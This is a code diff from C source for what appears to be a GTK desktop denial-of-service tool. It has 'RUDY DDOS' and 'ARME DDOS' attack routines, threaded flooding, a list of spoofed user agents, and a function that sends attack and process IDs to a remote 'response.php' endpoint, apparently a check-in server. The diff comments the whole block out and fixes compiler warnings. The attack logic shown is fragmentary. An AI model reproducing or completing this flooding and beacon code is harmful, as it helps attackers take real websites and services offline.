@@ -24,7 +24,9 @@
 extern GtkWidget *ddos_text_view;
 extern GtkWidget *main_win;
 
-const char *useragents[] =
+/*
+
+char *useragents[] =
 {
 	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
 	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
@@ -109,7 +111,7 @@ static int rps = 0;
 int parseURL(char *url, struct urlparts **returnpart);
 
 
-/** RUDY DDOS **/
+// RUDY DDOS
 void cb_rudy_ddos(GtkButton *button, gpointer user_data)
 {
     GtkWidget *target_url = NULL;
@@ -342,7 +344,6 @@ void cb_rudy_ddos(GtkButton *button, gpointer user_data)
 
 	char *parameter;
 
-	/*
 	if(user_data > 7)
 	{
 		parameter = argv[7];
@@ -350,15 +351,13 @@ void cb_rudy_ddos(GtkButton *button, gpointer user_data)
 
 	else
 	{
-	*/
 		parameter = "username";
-	//}
+	}
 
 
 	setupparts();
 	parseURL(target, returnparts);
 
-	/*
 	if(argc > 6 && !(strcmp(argv[6], "0") == 0))
 	{
 		ipstr = malloc(strlen(argv[6])+1);
@@ -368,7 +367,6 @@ void cb_rudy_ddos(GtkButton *button, gpointer user_data)
 
 	else
 	{
-	*/
     struct hostent *he;
     struct in_addr a;
     he = gethostbyname(returnparts[host]->value);
@@ -384,7 +382,9 @@ void cb_rudy_ddos(GtkButton *button, gpointer user_data)
     }
 
     else
+    {
         herror("gethostbyname");
+    }
 
 	char *targeturl = target;
 	char *targetparameter = parameter;
@@ -922,7 +922,12 @@ END:
 	wait_time_end(atoi(time_duration));
 
     for(i = 0; i < atoi(threads_number_string); i++)
+    {
         pthread_cancel(thread[i]);
+    }
+
+    (void)button;
+    (void)user_data;
 
 	return;
 }
@@ -1039,7 +1044,7 @@ void setupparts()
 
 int parseURL(char *url, struct urlparts **returnpart)
 {
-	register i;
+	size_t i;
 	int seplen;
 	char * remainder;
 	char * regall = ":/;?#";
@@ -1119,7 +1124,7 @@ char *str_replace(char *orig, char *rep, char *with) {
 	with = "";
 	len_with = strlen(with);
 
-	for(count = 0; tmp = strstr(ins, rep); ++count)
+	for(count = 0; (tmp = strstr(ins, rep)); ++count)
 	{
 		ins = tmp + len_rep;
 	}
@@ -1340,7 +1345,7 @@ int fnAttackInformation(int attackID)
 	snprintf(packet, sizeof(packet) - 1, "GET /~dqyefldi/response.php?auth=tru&id=%d&pro=%d HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\
 	Cache-Control: no-cache\r\nOrigin: http://google.com\r\n\
 	User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\r\n\
-	Content-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\nAccept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n", attackID, getpid(), ip);
+	Content-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\nAccept-charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n", attackID, getpid(), ip);
 
 	struct sockaddr_in *remote;
 	int sock;
@@ -1404,7 +1409,7 @@ int fnAttackInformation(int attackID)
 	return 0;
 }
 
-/** ARME DDOS **/
+// ARME DDOS
 void cb_arme_ddos(void)
 {
     GtkWidget *target_url = NULL;
@@ -1806,3 +1811,5 @@ void *flood_arme(void *par)
 		//startpoint = startpoint->next;
 	}
 }
+
+*/
